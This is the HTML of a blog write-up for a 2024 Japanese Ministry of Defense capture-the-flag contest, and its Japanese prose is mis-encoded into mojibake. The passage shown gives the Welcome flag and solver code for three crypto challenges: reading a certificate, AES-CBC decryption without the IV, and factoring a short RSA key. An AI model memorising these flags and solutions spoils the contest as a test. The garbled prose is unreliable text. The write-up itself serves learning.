<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>é˜²è¡›çœã‚µã‚¤ãƒãƒ¼ã‚³ãƒ³ãƒ†ã‚¹ãƒˆ 2024 - Writeup | ä¿ºã¨ãŠå‰ã¨laysakura</title>
  
  <link rel="canonical" href="https://laysakura.github.io/2024/02/26/vlc-cybercontest-2024/"/>
  <meta name="viewport" content="width=device-width">
  <meta name="description" content="é˜²è¡›çœã‚µã‚¤ãƒãƒ¼ã‚³ãƒ³ãƒ†ã‚¹ãƒˆ 2024ã«å‚åŠ ã—ã€450äººä¸­7ä½ã®æˆç¸¾ã‚’åã‚ã¾ã—ãŸ âœŒï¸ æ„Ÿæƒ³ã¨writeupã‚’æ›¸ãã¾ã™ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="é˜²è¡›çœã‚µã‚¤ãƒãƒ¼ã‚³ãƒ³ãƒ†ã‚¹ãƒˆ 2024 - Writeup">
<meta property="og:url" content="https://laysakura.github.io/2024/02/26/vlc-cybercontest-2024/index.html">
<meta property="og:site_name" content="ä¿ºã¨ãŠå‰ã¨laysakura">
<meta property="og:description" content="é˜²è¡›çœã‚µã‚¤ãƒãƒ¼ã‚³ãƒ³ãƒ†ã‚¹ãƒˆ 2024ã«å‚åŠ ã—ã€450äººä¸­7ä½ã®æˆç¸¾ã‚’åã‚ã¾ã—ãŸ âœŒï¸ æ„Ÿæƒ³ã¨writeupã‚’æ›¸ãã¾ã™ã€‚">
<meta property="og:locale" content="ja_JP">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%201.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%202.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%203.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%204.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%205.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%206.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%207.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%208.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%209.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2010.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2011.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2012.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2013.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2014.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2015.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2016.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2017.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2018.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2019.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2020.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2021.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2022.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2023.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2024.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2025.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2026.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2027.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2028.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2029.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2030.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2031.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2032.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2033.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2034.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2035.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2036.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2037.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2038.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2039.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2040.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2041.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2042.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2043.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2044.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2045.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2046.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2047.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2048.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2049.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2050.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2051.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2052.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2053.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2054.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2055.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2056.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2057.png">
<meta property="article:published_time" content="2024-02-25T16:11:57.000Z">
<meta property="article:modified_time" content="2024-02-25T21:38:51.318Z">
<meta property="article:author" content="Sho Nakatani a.k.a. laysakura">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://laysakura.github.io/img/2024/02-25/Untitled.png">

  <!-- favicon -->
  <link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png">
  <link rel="icon" href="/favicon/favicon.ico">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png">
  <link rel="manifest" href="/favicon/site.webmanifest">
  <link rel="mask-icon" href="/favicon/safari-pinned-tab.svg" color="#5bbad5">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">

  

  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-22289437-2']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>


  <!-- MathJax -->
  <script type="text/javascript" id="MathJax-script" async
    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
  </script

<meta name="generator" content="Hexo 6.1.0"></head>

<body>
  <div id="container">
    <div class="mobile-nav-panel">
	<i class="icon-reorder icon-large"></i>
</div>
<header id="header">
	<h1 class="blog-title">
		<a href="/">ä¿ºã¨ãŠå‰ã¨laysakura</a>
	</h1>
	<nav class="nav">
		<ul>
			<li><a href="/archives">éå»ã®æŠ•ç¨¿</a></li>
			<li><a id="nav-search-btn" class="nav-icon" title="Search"></a></li>
			<li><a target="_blank" rel="noopener" href="http://cloud.feedly.com/#subscription%2Ffeed%2Fhttps%3A%2F%2Flaysakura.github.io%2Fatom.xml" id="nav-rss-link" class="nav-icon" title="RSS Feed"></a></li>
		</ul>
	</nav>
	<div id="search-form-wrap">
		<form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://laysakura.github.io"></form>
	</div>
</header>
    <div id="main">
      <article id="post-é˜²è¡›çœã‚µã‚¤ãƒãƒ¼ã‚³ãƒ³ãƒ†ã‚¹ãƒˆ2024-Writeup" class="post">
  <footer class="entry-meta-header">
    <span class="meta-elements date">
      <a href="/2024/02/26/vlc-cybercontest-2024/" class="article-date">
  <time datetime="2024-02-25T16:11:57.000Z" itemprop="datePublished">2024-02-26</time>
</a>
    </span>
  </footer>
  
  <header class="entry-header">
    
  
    <h1 class="article-title entry-title" itemprop="name">
      é˜²è¡›çœã‚µã‚¤ãƒãƒ¼ã‚³ãƒ³ãƒ†ã‚¹ãƒˆ 2024 - Writeup
    </h1>
  

  </header>
  <div class="entry-content">
    
    <img src="/img/2024/02-25/Untitled.png" width="auto" height="auto">

<p>é˜²è¡›çœã‚µã‚¤ãƒãƒ¼ã‚³ãƒ³ãƒ†ã‚¹ãƒˆ 2024ã«å‚åŠ ã—ã€450äººä¸­<strong>7ä½</strong>ã®æˆç¸¾ã‚’åã‚ã¾ã—ãŸ âœŒï¸</p>
<p>æ„Ÿæƒ³ã¨writeupã‚’æ›¸ãã¾ã™ã€‚</p>
<span id="more"></span>

<h2><span id="ç›®æ¬¡">ç›®æ¬¡</span></h2><!-- toc -->

<ul>
<li><a href="#%E9%A0%86%E4%BD%8D%E8%A7%A3%E3%81%91%E3%81%9F%E5%95%8F%E9%A1%8C">é †ä½ãƒ»è§£ã‘ãŸå•é¡Œ</a></li>
<li><a href="#%E6%84%9F%E6%83%B3">æ„Ÿæƒ³</a></li>
<li><a href="#welcome">Welcome</a></li>
<li><a href="#crypto">Crypto</a><ul>
<li><a href="#information-of-certificate">Information of Certificate</a></li>
<li><a href="#missing-iv">Missing IV</a></li>
<li><a href="#short-rsa-public-key">Short RSA Public Key</a></li>
<li><a href="#cryptographically-insecure-prng">Cryptographically Insecure PRNG</a></li>
</ul>
</li>
<li><a href="#forensics">Forensics</a><ul>
<li><a href="#ntfs-data-hide">NTFS Data Hide</a></li>
<li><a href="#ntfs-file-delete">NTFS File Delete</a></li>
<li><a href="#ntfs-file-rename">NTFS File Rename</a></li>
<li><a href="#hidden-variable">HiddEN Variable</a></li>
<li><a href="#my-secret">My Secret</a></li>
</ul>
</li>
<li><a href="#miscellaneous">Miscellaneous</a><ul>
<li><a href="#une-maison">Une Maison</a></li>
<li><a href="#string-obfuscation">String Obfuscation</a></li>
<li><a href="#where-is-the-legit-flag">Where Is the Legit Flag?</a></li>
<li><a href="#utter-darkness">Utter Darkness</a></li>
<li><a href="#serial-port-signal-%E8%A7%A3%E3%81%91%E3%81%AA%E3%81%8B%E3%81%A3%E3%81%9F">Serial Port Signal (è§£ã‘ãªã‹ã£ãŸ ğŸ˜­)</a></li>
</ul>
</li>
<li><a href="#network-nw">Network (NW)</a><ul>
<li><a href="#discovery">Discovery</a></li>
<li><a href="#exploit">Exploit</a></li>
<li><a href="#pivot">Pivot</a></li>
<li><a href="#fileextract">FileExtract</a></li>
<li><a href="#do-the-best-%E8%A7%A3%E3%81%91%E3%81%AA%E3%81%8B%E3%81%A3%E3%81%9F">Do tHe best (è§£ã‘ãªã‹ã£ãŸ ğŸ˜­)</a></li>
</ul>
</li>
<li><a href="#programming">Programming</a><ul>
<li><a href="#logistic-map">Logistic Map</a></li>
<li><a href="#randomness-extraction">Randomness Extraction</a></li>
<li><a href="#xml-confectioner">XML Confectioner</a></li>
<li><a href="#twisted-text">Twisted Text</a></li>
</ul>
</li>
<li><a href="#trivia">Trivia</a><ul>
<li><a href="#the-original-name-of-aes">The Original Name of AES</a></li>
<li><a href="#cve-record-of-lowest-number">CVE Record of Lowest Number</a></li>
<li><a href="#mfa-factors">MFA Factors</a></li>
</ul>
</li>
<li><a href="#web">Web</a><ul>
<li><a href="#browsers-have-local-storage">Browsers Have Local Storage</a></li>
<li><a href="#are-you-introspective">Are You Introspective?</a></li>
<li><a href="#insecure">Insecure</a></li>
<li><a href="#variation-%E8%A7%A3%E3%81%91%E3%81%AA%E3%81%8B%E3%81%A3%E3%81%9F">Variation (è§£ã‘ãªã‹ã£ãŸ ğŸ˜­)</a></li>
<li><a href="#bruteforce">Bruteforce</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

<h2><span id="é †ä½è§£ã‘ãŸå•é¡Œ">é †ä½ãƒ»è§£ã‘ãŸå•é¡Œ</span></h2><img src="/img/2024/02-25/Untitled%201.png" width="auto" height="auto">

<img src="/img/2024/02-25/Untitled%202.png" width="auto" height="auto">

<h2><span id="æ„Ÿæƒ³">æ„Ÿæƒ³</span></h2><p>ä»Šå›ã®ã‚³ãƒ³ãƒ†ã‚¹ãƒˆã¯ã‚ˆãã‚ã‚‹CTFã¨ã¯é•ã„ã€</p>
<ul>
<li>networkå•é¡Œã§OSCP, Boot2Rootçš„ãªå•é¡ŒãŒå‡ºã‚‹</li>
<li>pwnãŒãªã„</li>
</ul>
<p>ã¨ã„ã†ç‰¹å¾´ãŒã‚ã‚Šã€ä¸¡æ–¹ã¨ã‚‚è‡ªåˆ†ã«ã¯æœ‰åˆ©ã«åƒã„ã¦ã“ã®çµæœã ã£ãŸã¨æ€ã„ã¾ã™ã€‚</p>
<p>ä»Šã®å®ŸåŠ›ã§è§£ã‘ã‚‹ã¹ãå•é¡Œã¯è§£ãåˆ‡ã£ãŸã‹ãªï¼ˆDO_tHe_bestã¯é ‘å¼µã‚ŒãŸæ°—ã‚‚ã™ã‚‹ï¼‰ã¨ã„ã†æ€ã„ã§ã™ã€‚</p>
<p>Pivotã¨BruteforceãŒé¢ç™½ã‹ã£ãŸã®ã¨ã€Missing IVã¨Short RSA Public Keyã¯æ•™è‚²çš„ã§è‰¯ã„ãªã¨æ€ã„ã¾ã—ãŸã€‚</p>
<h2><span id="welcome">Welcome</span></h2><img src="/img/2024/02-25/Untitled%203.png" width="550px" height="auto">

<p>æ·»ä»˜ã«ãƒ•ãƒ©ã‚°ãŒãã®ã¾ã¾æ›¸ã„ã¦ã‚ã‚‹ã€‚</p>
<aside>
â›³ flag{WelcomeToMODCyberContest!}

</aside>

<h2><span id="crypto">Crypto</span></h2><h3><span id="information-of-certificate">Information of Certificate</span></h3><img src="/img/2024/02-25/Untitled%204.png" width="550px" height="auto">

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">% openssl x509 -<span class="keyword">in</span> Easy.crt -text -noout</span><br><span class="line">Certificate:</span><br><span class="line">    Data:</span><br><span class="line">        Version: 1 (0x0)</span><br><span class="line">        Serial Number: 2024 (0x7e8)</span><br><span class="line">    Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">        Issuer: C=XX, ST=Some-State, L=Nowhere, O=Invalid, OU=Invalid, CN=**QRK7rNJ3hShV.vlc-cybercontest.invalid**/emailAddress=user@QRK7rNJ3hShV.vlc-cybercontest.invalid</span><br><span class="line">        Validity</span><br><span class="line">            Not Before: Jan  1 00:00:00 2024 GMT</span><br><span class="line">            Not After : Feb  1 00:00:00 2024 GMT</span><br><span class="line">        Subject: C=XX, ST=Some-State, L=Nowhere</span><br><span class="line">        Subject Public Key Info:</span><br><span class="line">            Public Key Algorithm: rsaEncryption</span><br><span class="line">                RSA Public-Key: (512 bit)</span><br><span class="line">                Modulus:</span><br><span class="line">                    00:a6:61:cf:52:55:0a:e4:5e:9b:5c:99:3b:aa:20:</span><br><span class="line">                    90:0d:80:06:9a:9b:be:23:4c:17:0d:2c:<span class="built_in">fc</span>:d1:be:</span><br><span class="line">                    66:43:40:7f:55:10:6a:99:56:0c:b2:09:a5:a2:6d:</span><br><span class="line">                    2a:25:c4:ff:67:e4:e3:02:87:57:cf:77:af:67:04:</span><br><span class="line">                    31:c5:f7:9b:83</span><br><span class="line">                Exponent: 65537 (0x10001)</span><br><span class="line">    Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">         3c:ff:d8:42:a8:eb:2c:55:93:5c:73:a3:84:fa:ea:9b:f8:fb:</span><br><span class="line">         f2:06:50:e4:95:97:9f:5e:ad:c7:ac:b6:36:77:4b:66:1f:38:</span><br><span class="line">         20:bf:71:9d:83:32:c1:3c:35:4f:b9:98:b4:4c:97:87:53:7d:</span><br><span class="line">         84:80:83:<span class="built_in">df</span>:ab:10:cc:fa:88:b1</span><br></pre></td></tr></table></figure>

<p>ã§å‡ºã¦ããŸCNãŒãƒ•ãƒ©ã‚°ã€‚</p>
<aside>
â›³ flag{QRK7rNJ3hShV.vlc-cybercontest.invalid}

</aside>

<h3><span id="missing-iv">Missing IV</span></h3><img src="/img/2024/02-25/Untitled%205.png" width="550px" height="auto">

<p>AES-CBCã®å¾©å·ã®å•é¡Œã€‚AES-CBCã¯ä»¥ä¸‹ã®æ§‹é€ ã§æš—å·åŒ–ã—ã¦ã„ã‚‹ã€‚</p>
<img src="/img/2024/02-25/Untitled%206.png" width="auto" height="auto">

<p><a target="_blank" rel="noopener" href="https://aes.cryptohack.org/ecbcbcwtf/">https://aes.cryptohack.org/ecbcbcwtf/</a> ã‚ˆã‚Šå¼•ç”¨</p>
<ul>
<li>éµ: 128 bit (ä»Šå›ã¯æ—¢çŸ¥)</li>
<li>å¹³æ–‡: 128 bitã”ã¨ã«åˆ†å‰² (æœªçŸ¥)</li>
<li>æš—å·æ–‡: 128 bitã”ã¨ã«åˆ†å‰² (æ—¢çŸ¥)</li>
</ul>
<p>ã¨ã„ã†çŠ¶æ³ã€‚</p>
<p>ä»Šå›ã¯å¹¸ã„éµãŒã‚ã‹ã£ã¦ã„ã‚‹ã®ã§ã€å¾Œã‚ã®ãƒ–ãƒ­ãƒƒã‚¯ã‹ã‚‰é †ã«å¾©å·ã—ã¦ã‚„ã‚Œã°è‰¯ã„ï¼ˆç¾åœ¨ã®å¾©å·æ¸ˆã¿ãƒ–ãƒ­ãƒƒã‚¯ã‚’å‰ã®æš—å·ãƒ–ãƒ­ãƒƒã‚¯ã¨XORã™ã‚‹é–¢ä¿‚ã§å¾Œã‚ã‹ã‚‰å‡¦ç†ï¼‰ã€‚</p>
<p>ä¸€ç•ªæœ€åˆã®ãƒ–ãƒ­ãƒƒã‚¯ã ã‘ã¯IVãŒã‚ã‹ã‚‰ãªã„ã®ã§å¾©å·ã§ããªã„ãŒã€ãŸã¶ã‚“æœ€åˆã®ãƒ–ãƒ­ãƒƒã‚¯ã«å¤§äº‹ãªæƒ…å ±ã¯å…¥ã£ã¦ãªã„ã¨é«˜ã‚’æ‹¬ã‚‹ã€‚</p>
<p>ä»¥ä¸‹ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’æ›¸ã„ãŸã€‚å¾©å·çµæœã‚’ zip ã«ã—ã¦ã„ã‚‹ã®ã¯ã€æœ€åˆã«ç›®ã§è¦‹ãŸã‚‰ <code>PK</code> ã®zipãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒã‚¸ãƒƒã‚¯ã‚³ãƒ¼ãƒ‰ãŒå…ˆé ­ã«è¦‹ãˆãŸã‹ã‚‰ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;4285a7a182c286b5aa39609176d99c13&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;NoIV.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    encrypted_flag = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æš—å·æ–‡ã‚’ãƒ–ãƒ­ãƒƒã‚¯åˆ†å‰²</span></span><br><span class="line">enc_blocks = [encrypted_flag[i : i + <span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_flag), <span class="number">16</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc_blocks: <span class="subst">&#123;<span class="built_in">len</span>(enc_blocks)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">block_bytes</span>):</span><br><span class="line">    <span class="comment"># æš—å·æ–‡ã‚’å¾©å·</span></span><br><span class="line">    cipher =  AES.new(key, AES.MODE_ECB)</span><br><span class="line">    decrypted = cipher.decrypt(block_bytes)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">decrypted = <span class="built_in">bytes</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æš—å·æ–‡ã®ãƒ–ãƒ­ãƒƒã‚¯ã‚’é€†é †ã«å¾©å·</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc_blocks) - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="comment"># ãƒ–ãƒ­ãƒƒã‚¯å˜ä½“ã®å¾©å·</span></span><br><span class="line">    dec_ecb_block = decrypt_block(enc_blocks[i])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¾©å·çµæœã¯ã€å‰ã®ãƒ–ãƒ­ãƒƒã‚¯ã¨XORã•ã‚Œã¦ã„ã‚‹ã€‚å†åº¦XORã‚’ã¨ã‚‹ã“ã¨ã§å¾©å·</span></span><br><span class="line">    prev_enc_block = enc_blocks[i - <span class="number">1</span>]</span><br><span class="line">    dec_cbc_block = [blk ^ prev_blk <span class="keyword">for</span> blk, prev_blk <span class="keyword">in</span> <span class="built_in">zip</span>(dec_ecb_block, prev_enc_block)]</span><br><span class="line">    <span class="comment">#print(f&quot;decrypted block #&#123;i&#125;: &#123;&#x27;&#x27;.join([chr(c) for c in dec_cbc_block])&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">    decrypted = <span class="built_in">bytes</span>(dec_cbc_block) + decrypted</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ€åˆã®ãƒ–ãƒ­ãƒƒã‚¯ã¯IVãŒã‚ã‹ã‚‰ãªã„ã®ã§å¾©å·ã§ããªã„</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dec.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decrypted)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;decrypted data written to dec.zip&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å®Ÿè¡Œã™ã‚‹ã¨ã€ dec.zip ãŒã§ãã‚‹ã€‚unzipã™ã‚‹ã¨è‰²ã€…ãƒ•ã‚¡ã‚¤ãƒ«ãŒå‡ºã¦ãã‚‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% ag flag</span><br><span class="line">content.xml</span><br><span class="line"><span class="number">2</span>:...&lt;text:p text:style-name=<span class="string">&quot;P1&quot;</span>&gt;**flag&#123;ESYQV0fPMxz4wMmU&#125;**&lt;/text:p&gt;&lt;/office:text&gt;&lt;/office:body&gt;&lt;/office:document-content&gt;</span><br></pre></td></tr></table></figure>

<p>ã¨ã„ã†ã“ã¨ã§ã€</p>
<aside>
â›³ flag{ESYQV0fPMxz4wMmU}

</aside>

<h3><span id="short-rsa-public-key">Short RSA Public Key</span></h3><img src="/img/2024/02-25/Untitled%207.png" width="550px" height="auto">

<p>RSAã®å•é¡Œã®è§£æ³•ã¯è‡ªåˆ†ãƒ¡ãƒ¢ã¨ã—ã¦ <a target="_blank" rel="noopener" href="https://laysakura.notion.site/CTF-crypto-829de7f32c02413396ecc3c79b1d0ddf#6b13caf305e0411ca28a3e0fa57168c2">RSA - Notion</a> ã«ã¾ã¨ã‚ã¦ã‚ã‚‹ã€‚</p>
<p>ã¾ãšã¯æ·»ä»˜ã® .pem ã‚’é›‘ã«â†“ã«æŠ•ã’ã‚‹ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://8gwifi.org/PemParserFunctions.jsp">Online Certificate Decoder, decode crl,crt,csr,pem,privatekey,publickey,rsa,dsa,rasa publickey,ec</a></p>
<img src="/img/2024/02-25/Untitled%208.png" width="auto" height="auto">

<p>public exponentã¯ <code>e</code> modulus ã®éƒ¨åˆ†ãŒå…¬é–‹éµ <code>n</code> ã€‚10é€²æ•°ã«ã™ã‚‹ã¨:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% python -c <span class="string">&#x27;print(0xad81c92641c0b18c4eda551c1d7828044e3e4a7519aac90ee4691c4a86dce2e1)&#x27;</span></span><br><span class="line">**<span class="number">78479434358679743508116090024686132395246871443799969871485501232049475609313</span>**</span><br></pre></td></tr></table></figure>

<p>å…¬é–‹éµãŒçŸ­ã„ã®ã§ã€ç´ å› æ•°åˆ†è§£ã‚‚ç°¡å˜ã€‚â†“ã«æŠ•ã’ã‚‹ã€‚</p>
<img src="/img/2024/02-25/Untitled%209.png" width="auto" height="auto">

<p>ç´ å› æ•°åˆ†è§£ã‚‚ã§ããŸã®ã§ã€ã‚ã¨ã¯ã‚³ãƒ¼ãƒ‰ã‚’æ›¸ãã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">78479434358679743508116090024686132395246871443799969871485501232049475609313</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;RSA-cipher.dat&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> myfile:</span><br><span class="line">    c = bytes_to_long(myfile.read())</span><br><span class="line"></span><br><span class="line">p = <span class="number">1011146650909449935800449563521726151</span></span><br><span class="line">q = <span class="number">77614294907759846691928156982114516291863</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> n == p * q</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<p>å®Ÿè¡Œã™ã‚‹ã¨</p>
